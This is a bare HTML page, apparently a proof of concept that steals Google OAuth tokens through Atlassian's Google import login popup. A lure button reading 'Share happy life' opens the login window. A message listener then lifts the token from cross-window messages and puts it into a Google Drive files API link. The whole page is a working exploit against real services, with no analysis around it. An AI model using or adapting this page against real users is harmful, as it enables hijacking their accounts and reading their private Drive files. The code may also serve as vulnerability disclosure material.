<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title></title>
</head>
<body>

<script>

function clickon(){
	token = ""
	a = window.open("https://atlassian.net/gateway/api/import/google/login","conflunce","width=500,height=500");
	// console.log(a.location.href)
	window.addEventListener("message", function (event) {
		token = event.data.split(":")[1]
		document.getElementById("x").innerHTML = `<a href="https://www.googleapis.com/drive/v2/files?oauth_token=${token}">https://www.googleapis.com/drive/v2/files?oauth_token=${token}</a>`
    });
}
</script>
<button onclick="clickon()">Share happy life</button>
<p id="x"></p>
</body>
</html>
